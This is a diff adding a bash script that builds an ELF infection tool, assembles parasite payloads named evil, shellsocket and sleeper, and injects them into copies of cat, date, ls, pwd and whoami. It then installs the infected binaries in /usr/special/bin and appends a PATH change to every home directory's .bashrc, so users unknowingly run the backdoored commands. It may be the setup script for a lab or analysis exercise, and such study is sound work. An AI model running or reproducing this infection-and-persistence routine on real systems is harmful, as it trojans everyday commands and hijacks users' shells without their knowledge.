@@ -1,0 +1,45 @@
+#!/bin/bash
+cp -R /home/ubuntu/elfit /tmp/
+cd /tmp/elfit
+
+make
+
+cd parasites
+nasm evil64.asm
+nasm shellsocket64.asm
+nasm sleeper64.asm
+nasm evil.asm
+nasm shellsocket.asm
+nasm sleeper.asm
+cd ..
+
+mkdir clean infected
+cp /bin/cat /bin/date /bin/ls /bin/pwd /usr/bin/whoami clean 
+cp clean/* infected
+
+if [ `arch` == 'x86_64' ]; then
+	./elfit --parasite parasites/evil64 --reverse --entrypoint infected/whoami >> infected/whoami_output
+	./elfit --parasite parasites/evil64 --text --entrypoint infected/date >> infected/date_output
+	./elfit --parasite parasites/shellsocket64 --text --start-main init infected/ls >> infected/ls_output 
+	./elfit --parasite parasites/shellsocket64 --text --entrypoint infected/cat >> infected/cat_output
+	./elfit --parasite parasites/sleeper64 --text --got getcwd infected/pwd >> infected/pwd_output
+else
+	./elfit --parasite parasites/evil --reverse --entrypoint infected/whoami >> infected/whoami_output
+	./elfit --parasite parasites/evil --text --entrypoint infected/date >> infected/date_output
+	./elfit --parasite parasites/shellsocket --text --start-main init infected/ls >> infected/ls_output 
+	./elfit --parasite parasites/shellsocket --text --entrypoint infected/cat >> infected/cat_output
+	./elfit --parasite parasites/sleeper --text --got getcwd infected/pwd >> infected/pwd_output
+fi
+mkdir /usr/special
+mkdir /usr/special/bin
+
+cp infected/cat infected/date infected/ls infected/pwd infected/whoami /usr/special/bin
+
+chmod go-rx /tmp/elfit 
+
+for f in `find /home -maxdepth 1 -type d`; do
+	if [ $f != "/home" ] ; then
+		echo "export PATH=/usr/special/bin:\$PATH" >> $f/.bashrc
+	fi
+done
+
